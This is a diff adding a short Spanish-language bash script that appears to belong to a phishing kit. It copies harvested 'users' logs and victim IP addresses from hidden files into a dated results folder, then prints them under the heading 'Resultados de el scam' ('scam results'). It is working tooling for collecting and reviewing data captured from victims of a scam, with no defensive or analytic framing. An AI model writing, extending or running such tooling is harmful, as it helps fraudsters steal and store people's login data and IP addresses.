@@ -1,0 +1,17 @@
+date=$(cat .dt)
+mkdir Resultados
+cp .sx/logs.txt -r Resultados/$date.usuarios.txt
+cp .sx/ip.txt -r Resultados/$date.ip.txt
+scam=$(cat .sx/logs.txt)
+ip=$(cat .sx/ip.txt)
+bash .banner
+echo "Resultados de el scam:"
+echo ""
+echo "$scam"
+echo ""
+echo "Resultados Ip:"
+echo ""
+echo "$ip"
+echo ""
+ping -i 3 -c 3 localhost | echo "Actualizando Datos..."
+bash .tr
